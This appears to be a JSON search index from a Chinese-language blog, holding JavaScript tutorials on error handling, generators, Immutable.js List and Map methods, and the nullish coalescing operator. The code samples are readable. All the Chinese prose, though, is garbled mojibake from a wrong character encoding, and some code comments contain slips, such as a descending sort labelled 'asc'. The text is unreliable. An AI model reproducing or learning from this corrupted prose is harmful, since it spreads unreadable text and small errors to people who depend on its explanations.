ä¹Ÿå¯ä»¥æš´åŠ›è§£ï¼Œé€šé€šåŠ ä¸Š stopPropagation å’Œ preventDefaultï¼Œä½†æˆ‘è¦ºå¾—å»ç†è§£ä»–å€‘å¯¦éš›åˆ°åº•åœ¨ã€Œé é˜²ä»€éº¼ã€æœƒæ›´å¥½ã€‚","link":"/2022/08/26/javascript-drag-and-drop/"},{"title":"JavaScriptï¼è™•ç†éŒ¯èª¤çš„æ–¹æ³•","text":"ä¸€æ­¥ä¸€æ­¥å¼„æ‡‚å®ƒã€‚ ç°¡è¿°æœƒå¯«é€™ç¯‡æ˜¯å› ç‚ºå° JS çš„éŒ¯èª¤è™•ç†ä¸æ˜¯å¾ˆç†Ÿï¼Œè€Œæœ€è¿‘æ­£å¥½ç¢°åˆ°äº†ä¸€å€‹ä¸éŒ¯çš„ç¯„ä¾‹ï¼Œæƒ³è—‰æ­¤ä¾†è§£é‡‹ä¸€ä¸‹éŒ¯èª¤è™•ç†çš„æµç¨‹ï¼Œè·Ÿé †ä¾¿ä»‹ç´¹ throw Error çš„ç”¨æ³•ã€‚ ç¯„ä¾‹éŒ¯èª¤è™•ç†æ‡‰è©²æœ€ç™¼ç”Ÿåœ¨å¸¸ä¸²æ¥ API çš„æ™‚å€™ï¼Œæ‰€ä»¥é€™é‚Šå°±ç”¨ API ä¾†ç•¶ç¯„ä¾‹ï¼š 12345678910111213141516171819202122232425function App () { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { const fetchData = async () =&gt; { setIsPending(true) try { const response = await fetch(...) if (!response.ok) throw new Error(response.statusText) const json = await response.json() setData(json) } catch (err) { console.log(err.message) setError('Can not fetch the data') } finally { setIsPending(false) } } fetchData() }, []) return ...} é¦–å…ˆå…ˆä»‹ç´¹ä¸€ä¸‹ try...catch...finally çš„ç”¨é€”ã€‚ try è£¡é¢è² è²¬è™•ç†ã€Œæˆ‘å€‘é æœŸåŸ·è¡Œçš„ codeã€ï¼Œä¸€æ—¦é€™è£¡é¢æ‹‹å‡ºäº†ã€ŒExceptionï¼ˆä¾‹å¤–æƒ…å½¢ï¼‰ã€ï¼Œå°±æœƒç«‹åˆ»é€²åˆ° catch å€å¡Šï¼Œæ‰€ä»¥ catch ä¸­æœƒæ”¾æˆ‘å€‘æƒ³è¦ã€Œè™•ç†ä¾‹å¤–æƒ…å½¢çš„ codeã€ã€‚ æœ€å¾Œæ˜¯ finallyï¼Œé€™å€‹æ˜¯ä¸è«–æœ‰æ²’æœ‰å‡ºç¾ä¾‹å¤–æƒ…å½¢ï¼Œæœ€å¾Œéƒ½æœƒåŸ·è¡Œåˆ°çš„å€å¡Šï¼Œæ‰€ä»¥å¯ä»¥åœ¨é€™é‚Šæ”¾ã€ŒåŸ·è¡Œæ­£ç¢ºæˆ–éŒ¯èª¤éƒ½è¦åŸ·è¡Œçš„æ±è¥¿ã€ã€‚ ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘é¦–å…ˆç”¨ try åŒ…ä½äº† fetch API çš„ç¨‹å¼ç¢¼ï¼Œæ‰€ä»¥å¦‚æœæ­£ç¢ºåŸ·è¡Œçš„è©±å°±æœƒï¼š å–å¾— API è³‡æ–™ æŠŠè³‡æ–™å¯«å…¥ state ä½ å¯èƒ½æœƒæƒ³èªª if (!response.ok) throw new Error(response.statusText) çš„ç”¨æ„ä½•åœ¨ï¼Ÿ å®ƒçš„ä»»å‹™å¯é‡è¦äº†ï¼Œé€™æ˜¯å› ç‚ºå° fetch è€Œè¨€ï¼Œåªè¦ request ç™¼çš„å‡ºå»éƒ½ä¸ç®—æ˜¯ Exceptionï¼ˆå¾ˆé‡è¦çš„è§€å¿µï¼‰ï¼Œæ‰€ä»¥ 404 æˆ– 500 é€™äº›éƒ½ä¸ç®—æ•¸ï¼Œæ—¢ç„¶ä¸ç®—æ•¸ï¼Œå°±ä¸æœƒé€²åˆ° catch å€å¡Šï¼Œé€™æ¨£å­éº»ç…©å¯å°±å¤§äº†ã€‚ å› æ­¤é€™äº›æ‹¿ä¸åˆ°è³‡æ–™çš„æƒ…æ³æˆ‘å€‘å¿…é ˆè‡ªå·±è™•ç†ï¼Œé€éã€Œäººå·¥æ‹‹å‡º Exceptionã€çš„æ–¹å¼ä¾†é”æˆï¼Œå¦å‰‡çš„è©±æ˜¯ä¸æœƒé€²å…¥ catch å€å¡Šçš„å“¦ï¼ è‡³æ–¼ finally çš„éƒ¨åˆ†å¾ˆç°¡å–®ï¼Œå› ç‚ºä¸è«–æœ€å¾Œ fetch æˆåŠŸé‚„æ˜¯å¤±æ•—éƒ½è¦åœæ­¢ loadingï¼ˆisPendingï¼‰çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æŠŠ setIsPending æ”¾åœ¨é€™é‚Šä¾†è™•ç†æœƒæ˜¯ä¸éŒ¯çš„é¸æ“‡ã€‚ é—œæ–¼ Error ç‰©ä»¶é€™å€‹ç‰©ä»¶æœ€ä¸»è¦æœƒåŒ…å«å…©å€‹æ±è¥¿ï¼š name message name æ˜¯ç”¨ä¾†èªªæ˜é€™æ˜¯ä»€éº¼å‹åˆ¥çš„ä¾‹å¤–ï¼Œå¸¸è¦‹çš„æœ‰ï¼š Error é€šç”¨çš„éŒ¯èª¤ï¼ˆé€šå¸¸ç”¨åœ¨å®¢è£½åŒ–ï¼‰ RangeErrorï¼ˆæ•¸å­—è¶…å‡ºç¯„åœï¼‰ ReferenceErrorï¼ˆæ‰¾ä¸åˆ°è®Šæ•¸ï¼‰ SyntaxErrorï¼ˆèªæ³•éŒ¯èª¤ï¼‰ TypeErrorï¼ˆæ‰¾ä¸åˆ°å‡½å¼ï¼‰ URIErrorï¼ˆç•¶ç”¨äº†å…§å»ºçš„ URI Method å»çµ¦äº†ä¸åˆæ³•çš„ URI æ ¼å¼ï¼‰ EvalErrorï¼ˆä¸æ­£ç¢ºçš„ä½¿ç”¨ Eval é€™å€‹å‡½å¼ï¼‰ æ‰€ä»¥æˆ‘å€‘é€é throw ä¾†æ‹‹å‡ºéŒ¯èª¤æ™‚ï¼Œå°±æ˜¯åœ¨æŒ‡å®šé€™ name è·Ÿ message é€™å…©å€‹æ±è¥¿ã€‚åƒ throw new Error(response.statusText) çš„æ„æ€å°±æ˜¯æ‹‹å‡ºä¸€å€‹ï¼š name = Errorï¼ˆç¨®é¡ï¼‰ message = response.statusTextï¼ˆå…§å®¹ï¼‰ çš„ä¾‹å¤–æƒ…å½¢ã€‚ é€™é‚Šçœ‹å®Œå¾Œå†å›å»çœ‹ä¸Šé¢çš„ä¾‹å­æ‡‰è©²å°±æœƒç†è§£è¨±å¤šäº†ï¼Œå¸Œæœ›ä¹‹å¾Œå°æ–¼éŒ¯èª¤è™•ç†èƒ½å¤ è¶Šä¾†è¶ŠæŒæ¡ã€‚ åƒè€ƒè³‡æº [JS] Error Handling","link":"/2022/06/22/javascript-error-handling/"},{"title":"å¿«é€Ÿå…¥é–€ generator","text":"ä¸€å€‹æœ‰é»é‚Šç·£çš„æ±è¥¿ï¼Œä½†å­¸èµ·ä¾†é‚„ä¸éŒ¯ã€‚ ç°¡è¿°æœ€è¿‘æƒ³è¦å­¸ç¿’ redux saga é€™å€‹æ±è¥¿ï¼Œå¦‚æœä½ è½éé€™æ±è¥¿çš„è©±å°±æ‡‰è©²ä¹ŸçŸ¥é“å­¸ saga æœƒéœ€è¦ä¸€äº› generator çš„å‰å‚™çŸ¥è­˜ã€‚ ç¸½ä¹‹ï¼Œç‚ºäº†è®“æ¥ä¸‹ä¾†å­¸ç¿’ redux saga èƒ½å¤ é †åˆ©ï¼Œæ±ºå®šä¾†ç¨å¾®èªè­˜ä¸€ä¸‹é€™å€‹æ±è¥¿ã€‚ ä»€éº¼æ˜¯ generatorï¼Ÿæˆ‘è¦ºå¾—ç”¨ç¯„ä¾‹ä¾†è§£é‡‹æœ€å¿«ï¼Œæ‰€ä»¥å…ˆä¾†çœ‹æ®µ codeï¼š 123456789101112131415function* myGenerator() { for (let i = 1; i &lt;= 3; i++) { yield i }}// å›å‚³å€¼æ˜¯ä¸€å€‹è¿­ä»£å™¨// ä½†æ¯”èµ·é€™å€‹èªªæ³•ï¼Œæˆ‘è¦ºå¾—ã€Œå¯ä»¥æš«åœçš„ functionã€ æ˜¯ä¸€å€‹æ›´å¥½ç†è§£çš„æ–¹å¼ã€‚const iterable = myGenerator()console.log(iterable.next()) // { value: 1, done: false }console.log(iterable.next()) // { value: 2, done: false }console.log(iterable.next()) // { value: 3, done: false }console.log(iterable.next()) // { value: undefined, done: true }console.log(iterable.next()) // { value: undefined, done: true }console.log(iterable.next()) // { value: undefined, done: true } ä½¿ç”¨ generator çš„æ–¹å¼å°±æ˜¯åœ¨ function å¾Œé¢åŠ ä¸Šä¸€å€‹ *ï¼Œé›–ç„¶ä¹Ÿå¯ä»¥åŠ åœ¨åç¨±å‰é¢ï¼Œä½†æˆ‘é‚„æ˜¯åå¥½åŠ åœ¨ function å¾Œé¢ã€‚ æ¥è‘—åŸ·è¡Œé€™å€‹ function æ™‚ï¼Œè·Ÿä¸€èˆ¬çš„ function æœ‰å€‹æœ€å¤§çš„ä¸åŒï¼Œå°±æ˜¯å®ƒä¸æœƒç«‹å³åŸ·è¡Œæ¯ä¸€åœˆè¿´åœˆï¼Œè·‘åˆ°è¿´åœˆçµæŸç‚ºæ­¢ï¼Œè€Œæ˜¯æœƒè¢«ã€Œæš«åœä½ã€ï¼Œç„¶å¾Œå›å‚³ä¸€å€‹ iterableã€‚ è‡³æ–¼ä»€éº¼æ˜¯ iterableï¼Ÿç°¡å–®ä¾†èªªï¼Œä½ åªè¦æƒ³æˆæ¯ä¸€æ¬¡æˆ‘ call iterable.next() æ™‚ï¼Œå®ƒå°±æœƒæ‰¾åˆ°ä¸‹ä¸€å€‹ yield çš„ä½ç½®ï¼Œç¹¼çºŒå¾€ä¸‹åŸ·è¡Œï¼Œç›´åˆ°åˆç¢°åˆ°ä¸‹ä¸€å€‹ yield ç‚ºæ­¢ã€‚ å› ç‚ºæˆ‘æ¯ä¸€æ¬¡éƒ½æ˜¯åœ¨è¿­ä»£ yield é€™å€‹é—œéµå­—ï¼Œæ‰€ä»¥æ‰æœƒèªªæ˜¯ã€Œiterableï¼ˆå¯è¿­ä»£çš„ï¼‰ã€ å¦å¤– next() æœ‰å›å‚³å€¼ï¼Œå…§å®¹é•·é€™æ¨£ï¼š 12345// typescripttype res = { value: string done: boolean} ä»¥å‰›å‰›çš„ä¾‹å­ä¾†èªªä½ å¤§æ¦‚å°±çŒœçš„å‡ºä¾†ç”¨æ„äº†ï¼Œvalue å°±æ˜¯ yield å¾Œé¢æ¥çš„å€¼ï¼Œè€Œ done å‰‡æ˜¯ç”¨ä¾†è¡¨ç¤ºã€Œç›®å‰æœ‰æ²’æœ‰ yieldï¼Ÿã€ é †é“ä¸€æï¼Œå¦‚æœ generator æœ‰ return å›å‚³å€¼çš„è©±ï¼Œçµæœå°±æœƒè®Šé€™æ¨£ï¼š 123456789101112function* myGenerator() { for (i = 1; i &lt;= 3; i++) { yield i } return i}const iterable = myGenerator()console.log(iterable.next()) // { value: 1, done: false }console.log(iterable.next()) // { value: 2, done: false }console.log(iterable.next()) // { value: 3, done: false }console.log(iterable.next()) // { value: 4, done: true } ç®—æ˜¯ä¸€å€‹ç‰¹ä¾‹ï¼Œå¯ä»¥è®“ä½ åœ¨ done: true çš„æ™‚å€™é‚„èƒ½æ‹¿åˆ° valueï¼Œä¸éä¸€èˆ¬ä¸æœƒé€™æ¨£ç”¨ï¼Œé€™é‚Šåªæ˜¯é †ä¾¿æä¸€ä¸‹ã€‚ é€™å°±æ˜¯é—œæ–¼ generator çš„æœ€æœ€æœ€åŸºæœ¬çš„ç”¨æ³•ã€‚ åœ¨ next ä¸­å‚³å…¥åƒæ•¸é€™æ˜¯å¦ä¸€å€‹åœ¨ generator ä¸­å¾ˆé‡è¦çš„è§€å¿µï¼Œå»ºè­°ä¸€å®šè¦å¼„æ‡‚ã€‚ ç°¡å–®ä¾†èªªï¼Œåœ¨ next å‚³å…¥çš„åƒæ•¸å¯ä»¥ã€Œæ”¹å¯«ä¸Šä¸€å€‹ yield çš„å€¼ã€ï¼Œä¸€æ¨£ä¾†çœ‹ä¾‹å­ï¼š 1234567891011function* myGenerator(x) { const y = 2 * (yield x + 1) const z = yield y / 3 return x + y + z}const iterable = myGenerator(5)console.log(iterable.next().value)console.log(iterable.next(12).value)console.log(iterable.next(13).value) çœ‹èµ·ä¾†æœ‰å¤ è¤‡é›œï¼Œä½†åªè¦ç…§è‘— code ä¾†ä¸€æ­¥ä¸€æ­¥ä¾†åŸ·è¡Œå°±æœƒå¥½æ‡‚ä¸€äº›äº†ï¼š iterable.next() å› ç‚ºé€™æ˜¯ç¬¬ä¸€å€‹ yieldï¼Œæ‰€ä»¥ä¸å‚³å…¥åƒæ•¸ï¼Œ5 + 1 å¾—åˆ° 6ã€‚ iterable.next(12) ä¾ç…§å‰›å‰›èªªçš„ï¼ŒæŠŠä¸Šä¸€å€‹ yield å¾Œé¢çš„å€¼å…¨éƒ¨æ”¹å¯«ï¼Œæ‰€ä»¥å°±æœƒå¾ (x + 1) è®Šæˆ 12ã€‚ æ¥è‘— const y = 2 * 12 å¾—åˆ° 24ï¼Œæ‰€ä»¥ç›®å‰çš„ yield å¾Œé¢çš„å€¼å°±æœƒæ˜¯ 8ï¼ˆ24 / 3ï¼‰ã€‚ iterable.next(13) ä¸€æ¨£æŠŠä¸Šä¸€å€‹ yield å¾Œé¢çš„å€¼å…¨éƒ¨æ”¹å¯«ï¼Œæ‰€ä»¥å°±æœƒå¾ y / 3 è®Šæˆ 13ã€‚ æœ€å¾Œé€™æ¬¡å› ç‚ºæ˜¯ returnï¼Œæ‰€ä»¥ 5 + 24 + 13 å¾—åˆ° 42 å¦‚æœæœ‰é»é›£æ‡‚çš„è©±ï¼Œå¯ä»¥æƒ³æˆé€™æ¨£ï¼š 12345function* myGenerator (5) { const y = 2 * (yield (12)); const z = yield (13); return 5 + 24 + 13;} for â€¦ ofiteralbe å¯ä»¥ç”¨ for...of ä¾†éæ­· yield çš„å€¼ï¼š 1234567891011121314function* myGenerator() { yield 1 yield 4 yield 10}const iterable = myGenerator()for (const x of iterable) { // 1 // 4 // 10 console.log(x)} ç¸½ä¹‹å‘¢ï¼Œæˆ‘è¦ºå¾—æœ€é‡è¦çš„æ˜¯ä¸€å®šè¦åˆ†æ¸…æ¥š next() è·Ÿ next(param) çš„è¡Œç‚ºæœ‰ä»€éº¼ä¸åŒï¼Œç›®å‰é—œæ–¼ generator çš„éƒ¨åˆ†å…ˆçŸ¥é“é€™äº›å°±å·®ä¸å¤šäº†ï¼Œå‰©ä¸‹çš„æœ‰æ™‚é–“å†å»ç ”ç©¶å°±å¥½ã€‚ æœ€å¾Œï¼Œå¦‚æœä½ æƒ³è©¦çœ‹çœ‹ç”¨ generator ä¾†å¯¦ä½œã€ŒéåŒæ­¥ã€æ“ä½œçš„è©±ï¼Œå¯ä»¥åƒè€ƒï¼šå¾ callback åˆ° Promise å†åˆ° generator ã€‚ åƒè€ƒè³‡æ–™ æ·ºå…¥æ·ºå‡º Generator Function","link":"/2022/05/19/javascript-generator/"},{"title":"JavaScriptï¼Immutable.JS","text":"æœ‰æ©Ÿæœƒçš„è©±æƒ³å°å…¥çœ‹çœ‹ã€‚ ç°¡è¿°Immutableï¼ˆä¸å¯è®Šï¼‰åœ¨é–‹ç™¼ä¸­æ˜¯ä¸€å€‹å¾ˆé‡è¦çš„æ¦‚å¿µï¼Œå®ƒæœ‰å¹¾å€‹å„ªé»ï¼š å¯é æ¸¬æ€§ å¯è¿½æœ”æ€§ æ¸›å°‘ Side Effect åœ¨ JavaScript è£¡ã€ŒArrayã€å’Œã€ŒObjectã€éƒ½æ˜¯ mutableï¼ˆå¯è®Šï¼‰çš„è³‡æ–™å‹æ…‹ï¼Œé€™æ™‚å€™å¦‚æœæ²’æœ‰ç”¨ã€ŒImmutable çš„è§€å¿µã€ä¾†æ“ä½œçš„è©±å°±æœƒå¼•ç™¼ä¸€äº›ä¸å¯é æ¸¬çš„è¡Œç‚ºã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹ Arrayï¼Œæˆ‘æƒ³å–å‡ºæœ€å¾Œä¸€ç­†çš„å€¼ï¼Œé€™æ™‚å€™å°±æœƒå‡ºç¾ã€ŒåŸæœ¬çš„ Array ä¹Ÿè¢«æ”¹æ‰äº†ã€çš„æƒ…æ³ç™¼ç”Ÿï¼Œåƒé€™æ¨£ï¼š 1234const array = [1, 2, 3, 4, 5]const lastOne = array.pop()console.log(lastOne) // 5console.log(array) // [ 1, 2, 3, 4 ] æˆ‘ç¢ºå¯¦æ‹¿åˆ°äº†æœ€å¾Œä¸€å€‹å€¼ 5ï¼Œä½†æ³¨æ„åŸæœ¬çš„ array ä¹Ÿè¢«æ”¹æ‰äº†ã€‚ ç‚ºäº†ä¸æ”¹è®ŠåŸæœ¬çš„ arrayï¼Œæˆ‘å€‘å¯ä»¥ç”¨ã€Œæ‹·è²ã€çš„æ–¹å¼ä¾†åšï¼Œåƒé€™æ¨£ï¼š 12345const array = [1, 2, 3, 4, 5]const lastOne = [...array].pop()console.log(lastOne) // 5console.log(array) // [1, 2, 3, 4, 5] é€™é‚Šæ˜¯ç”¨ã€Œæ·ºæ‹·è²ã€ä¾†åšè¤‡è£½ï¼Œç•¶è³‡æ–™å‹æ…‹æ›´è¤‡é›œæ™‚ä½ å¯èƒ½æœƒéœ€è¦ç”¨ã€Œæ·±æ‹·è²ã€ä¾†è™•ç†ã€‚åªæ˜¯é †ä¾¿æä¸€ä¸‹ï¼Œä¸æ˜¯é€™ç¯‡è¦æçš„é‡é»ã€‚ ç¸½ä¹‹é€™ç¨®ä½œæ³•å°±æ˜¯ã€ŒImmutableã€çš„è§€å¿µï¼Œæˆ‘æ¯ä¸€æ¬¡éƒ½æ˜¯ã€Œç”¢ç”Ÿä¸€å€‹å…¨æ–°çš„ç‰©ä»¶ã€ï¼Œè€Œä¸æ˜¯ç›´æ¥å»æ”¹ã€ŒåŸæœ¬çš„ Referenceã€ï¼Œæ‰€ä»¥åŸæœ¬çš„ array æ°¸é ä¸æœƒè¢«å‹•åˆ°ã€‚ ä¸éé€™å°±å¼•ç™¼äº†å¦å¤–ä¸€å€‹å•é¡Œï¼š å¦‚æœæˆ‘åªæ˜¯æƒ³æ”¹æŸå€‹åœ°æ–¹ï¼Œå»åˆè¦å…ˆæŠŠåŸå§‹è³‡æ–™æ•´ç­†è¤‡è£½ä¸€ä»½çš„è©±ï¼Œè±ˆä¸æ˜¯æœ‰é»æµªæ•ˆèƒ½ï¼Ÿ æ‰€ä»¥é€™ç¯‡å°±ä¾†ä»‹ç´¹ Immutable.jsï¼Œä¸€å€‹ç”±è‡‰æ›¸é–‹æºå‡ºä¾†çš„å¥—ä»¶ã€‚ Listå»ºç«‹æ–¹å¼é€™å€‹åŸºæœ¬ä¸Šå°±æ˜¯ JS ä¸­çš„ Arrayï¼Œå»ºç«‹æ–¹å¼ä¹Ÿå¾ˆç°¡å–®ï¼š 123const list = List([1, 2, 3, 4, 5])console.log(list) // List [ 1, 2, 3, 4, 5 ]console.log(list.toJS()) // [ 1, 2, 3, 4, 5 ] toArrayå…¶ä¸­ä¸€å€‹è½‰æˆ JS çš„æ–¹æ³•ï¼Œä½†è¦æ³¨æ„æ˜¯ã€Œæ·ºæ‹·è²ã€ï¼š 123456789// æ·ºæ‹·è²const list = List([[1], 2, 3, 4, 5])const toArray1 = list.toArray()const toArray2 = list.toArray()console.log(toArray1) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray2) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray1 === toArray2) // falseconsole.log(toArray1[0] === toArray2[0]) // true toJSè½‰æˆ JS çš„æ–¹æ³•ï¼Œé€™å€‹æ‰æ˜¯ã€Œæ·±æ‹·è²ã€ï¼š 123456789// æ·±æ‹·è²const list = List([[1], 2, 3, 4, 5])const toArray1 = list.toJS()const toArray2 = list.toJS()console.log(toArray1) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray2) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray1 === toArray2) // falseconsole.log(toArray1[0] === toArray2[0]) // false isListæª¢æŸ¥å€¼æ˜¯ä¸æ˜¯ List é€™å€‹å‹æ…‹ï¼š 12345const array = [1, 2, 3, 4, 5]const list = List([[1], 2, 3, 4, 5])console.log(List.isList(array)) // falseconsole.log(List.isList(list)) // true ofå¦‚æœè¦é€é List ä¾†å»ºç«‹æ–°çš„ List çš„è©±ï¼Œè¦æ³¨æ„å€¼åªèƒ½æ˜¯ Arrayï¼Œä¸å¯ä»¥æ˜¯åˆ¥çš„å€¼ï¼š 1234// æ­£ç¢ºçš„ä½œæ³•const list1 = List([1, 2, 3])// éŒ¯èª¤çš„ä½œæ³•ï¼ˆTypeErrorï¼‰const list2 = List(1, 2, 3) å¦‚æœè¦å‚³é Array çš„å€¼çš„è©±è¦æ”¹ç”¨ of ä¾†å»ºç«‹ï¼š 1234567const list1 = List.of(1, 2, 3)const list2 = List.of({ name: 'PeaNu', age: 20 })const list3 = List.of(false, true)console.log(list1.toArray()) // [ 1, 2, 3 ]console.log(list2.toArray()) // [ { name: 'PeaNu', age: 20 } ]console.log(list3.toArray()) // [ false, true ] sizeç”¨ä¾†æŸ¥çœ‹é•·åº¦ï¼ˆlengthï¼‰çš„å±¬æ€§ï¼š 12const list = List([1, 2, 3])console.log(list.size) // 3 setç”¨ä¾†è¨­å®šé™£åˆ—å€¼çš„æ–¹æ³•ï¼š 12345678910111213const list = List([1, 2, 3])const list2 = list.set(3, 4)console.log(list2.toArray()) // [ 1, 2, 3, 4 ]const list3 = list.set(0, 100)console.log(list3.toArray()) // [ 100, 2, 3 ]const list4 = list.set(5, 10)console.log(list4.toArray()) // [ 1, 2, 3, undefined, undefined, 10 ]const list5 = list.set(-1, 0)console.log(list5.toArray()) // [1, 2, 0] deleteåˆªé™¤é™£åˆ—å€¼ï¼Œå¯ä»¥æƒ³æˆæ˜¯ Imuutable çš„ splice(0, index)ï¼š 123456789const list = List([1, 2, 3, 4, 5])const list1 = list.delete(0)console.log(list1.toArray()) // [ 2, 3, 4, 5]const list2 = list.delete(3)console.log(list2.toArray()) // [1, 2, 3, 5]const list3 = list.delete(-1)console.log(list3.toArray()) // [1, 2, 3, 4] insertåœ¨æŒ‡å®šçš„ index ä¸­æ’å€¼ï¼š 123456const list = List([1, 2, 3, 4, 5])const list2 = list.insert(0, 0)console.log(list2.toArray()) // [ 0, 1, 2, 3, 4, 5 ]const list3 = list.insert(2, 'Hi')console.log(list3.toArray()) // [ 1, 2, 'Hi', 3, 4, 5 ] push &amp; popç†Ÿæ‚‰çš„ push èˆ‡ popï¼Œä¸éæ˜¯ Immutable ç‰ˆï¼š 12345const list = List([1, 2, 3, 4, 5])const list2 = list.push(6)console.log(list.toArray()) // [ 1, 2, 3, 4, 5 ]console.log(list2.toArray()) // [ 1, 2, 3, 4, 5, 6 ] 12345const list = List([1, 2, 3, 4, 5])const list2 = list.pop()console.log(list.toArray()) // [ 1, 2, 3, 4, 5 ]console.log(list2.toArray()) // [ 1, 2, 3, 4 ] shift &amp; unshiftç†Ÿæ‚‰çš„ shift èˆ‡ unshiftï¼Œä¸éæ˜¯ Immutable ç‰ˆï¼š 1234567const list = List([1, 2, 3, 4, 5])const list2 = list.unshift(0)const list3 = list.shift()console.log(list.toArray()) // [ 1, 2, 3, 4, 5 ]console.log(list2.toArray()) // [ 0, 1, 2, 3, 4, 5 ]console.log(list3.toArray()) // [ 2, 3, 4, 5 ] mergeæŠŠå…©å€‹é™£åˆ—åˆä½µï¼š 1234const a = List([1, 2, 3, 4, 5])const b = List([6, 7, 8, 9])console.log(a.merge(b).toArray()) // [1, 2, 3, 4, 5, 6, 7, 8, 9] sortByæƒ³å¿«é€Ÿç”¨ã€Œå­—å…¸åºã€ä¾†æ’åºçš„æ™‚å€™é‚„ä¸éŒ¯ç”¨ï¼š 123const foods = List([{ name: 'Orange' }, { name: 'Grape' }, { name: 'Banana' }, { name: 'Candy' }])const sortedFoods = foods.sortBy((food) =&gt; food.name)console.log(sortedFoods.toArray()) è¼¸å‡ºçµæœï¼š 1;[{ name: 'Banana' }, { name: 'Candy' }, { name: 'Grape' }, { name: 'Orange' }] Mapç°¡å–®ä¾†èªªå°±æ˜¯ç‰©ä»¶ï¼ŒåŸºæœ¬ä¸Šéƒ½è·Ÿ List çš„ç”¨æ³•å·®ä¸å¤šï¼Œæ‰€ä»¥é€™è£¡å°±ç›´æ¥ç¤ºç¯„äº†ã€‚ å»ºç«‹æ–¹å¼ç›´æ¥æŠŠ Object å‚³é€²å»å°±è¡Œäº†ï¼š 12const map = Map({ name: 'PeaNu', age: 20, gender: 'man' })console.log(map.toObject()) // { name: 'PeaNu', age: 20, gender: 'man' } setè¨­å®šå…§å®¹ï¼ˆå–®å±¤ï¼‰ï¼š 12const map = Map().set('name', 'PeaNu').set('age', 20).set('gender', 'man')console.log(map.toObject()) // { name: 'PeaNu', age: 20, gender: 'man' } setInè¨­å®šå…§å®¹ï¼ˆå¤šå±¤ï¼‰ï¼š 1234567891011121314151617181920212223const a = Map({ name: 'PeaNu', age: 20, gender: 'man', relation: { wife: 'PPB', father: 'JOJO', friend: 'DIO' }})const newOne = a.setIn(['relation', 'father'], 'Caesar')// {// name: 'PeaNu',// age: 20,// gender: 'man',// relation: {// wife: 'PPB',// father: 'Caesar',// friend: 'DIO'// }// }console.log(newOne.toObject()) deleteåˆªé™¤æŸå€‹å±¬æ€§ï¼ˆå–®å€‹ï¼‰ï¼š 12345678const map = Map({ name: 'PeaNu', age: 20, gender: 'man'})const map2 = map.delete('name')console.log(map.toObject()) // { name: 'PeaNu', age: 20, gender: 'man' }console.log(map2.toObject()) // { gender: 'man', age: 20 } deleteAllåˆªé™¤å¤šå€‹æ¬„ä½ï¼ˆå‚³é™£åˆ—ï¼‰ï¼š 1234567const map = Map({ name: 'PeaNu', age: 20, gender: 'man'})const map2 = map.deleteAll(['name', 'age'])console.log(map2.toObject()) // { gender: 'man' } mergeåˆä½µï¼š 123456789101112131415161718192021const a = Map({ name: 'PeaNu', age: 20, gender: 'man'})const b = Map({ brother: 'JOJO', father: 'DIO', wife: 'PPB'})// {// name: 'PeaNu',// age: 20,// gender: 'man',// brother: 'JOJO',// father: 'DIO',// wife: 'PPB'// }console.log(a.merge(b).toObject()) mergeWithä¸€èˆ¬çš„ merge å¦‚æœç¢°åˆ°ã€Œç›¸åŒå€¼ã€çš„è©±æœƒç›´æ¥è¦†å¯«ï¼Œå¦‚æœä½ å¸Œæœ›ã€Œä¸è¦è¦†è“‹ã€ï¼Œæƒ³åšä¸€äº›è™•ç†çš„è©±å¯ä»¥æ”¹ç”¨é€™å€‹æ–¹å¼ï¼š 123456789101112const a = Map({ a: 10, b: 20, c: 30 })const b = Map({ a: 40, b: 50, e: 60, f: 30 })const result1 = a.mergeWith((oldVal, newVal) =&gt; { // Ex: a(10) + a(40) return oldVal + newVal}, b)const result2 = a.merge(b)console.log(result1.toObject()) // { a: 50, b: 70, c: 30, e: 60, f: 30 }console.log(result2.toObject()) // { a: 40, b: 50, c: 30, e: 60, f: 30 } mapçµ¦ Object ç”¨çš„ mapï¼Œæˆ‘è¦ºå¾—å¾ˆé…·ï¼š 123const obj = Map({ a: 10, b: 20 })const obj2 = obj.map((num) =&gt; num * 2)console.log(obj2.toObject()) // { a: 20, b: 40 } reverseå¯ä»¥åè½‰å…§å®¹ï¼š 123const obj = Map({ a: 10, b: 20 })const obj2 = obj.reverse()console.log(obj2.toObject()) sortç¥å¥‡çš„æ’åºï¼š 1234567const obj = Map({ a: 5, b: 12, c: 10, d: 8, e: 24, f: 3 })const asc = obj.sort((a, b) =&gt; b - a)const desc = obj.sort((a, b) =&gt; a - b)console.log(asc.toObject()) // { e: 24, b: 12, c: 10, d: 8, a: 5, f: 3 }console.log(desc.toObject()) // { f: 3, a: 5, d: 8, c: 10, b: 12, e: 24 }","link":"/2022/08/13/javascript-immutable-js/"},{"title":"JavaScript ä¾†çœ‹çœ‹ç¥å¥‡çš„ ? è·Ÿ ?? é‹ç®—å­","text":"??????ï¼ˆåˆ°åº•åœ¨ï¼Ÿ Nullish Coalescing Operator ??é‹ç®—å­ç°¡å–®ä¾†èªªï¼Œä¸€èˆ¬æˆ‘å€‘åœ¨æ±ºå®šé è¨­å€¼çš„æ™‚å€™æœƒç”¨ || ä¾†åšçŸ­è·¯é‹ç®—ï¼š 12345678910111213const person = { name: null, interesting: '', age: 0}const name = person.name || 'PeaNu'const interesting = person.interesting || 'coding'const age = person.age || 18console.log(name) // 'PeaNu'console.log(interesting) // 'coding'console.log(age) // 18 åœ¨ä¸Šé¢çš„ä¾‹å­å› ç‚º nullã€\"\" å’Œ 0 éƒ½æ˜¯å‡å€¼ï¼Œæ‰€ä»¥æœƒå¥—ç”¨ || å¾Œé¢çš„é è¨­å€¼ã€‚ å¯æ˜¯æœ‰äº›æ™‚å€™æˆ‘å€‘å¯èƒ½å°±æ˜¯æƒ³è¦é€™äº›å‡å€¼ï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”¨åˆ° ?? é‹ç®—å­äº†ã€‚é€™å€‹æ±è¥¿å«åšã€ŒNullish coalescing operatorã€ï¼Œæ˜¯ ES2020ï¼ˆES11ï¼‰ æ¨å‡ºçš„åŠŸèƒ½ã€‚ ç›´æ¥ä¾†çœ‹ç¯„ä¾‹å§ï¼š 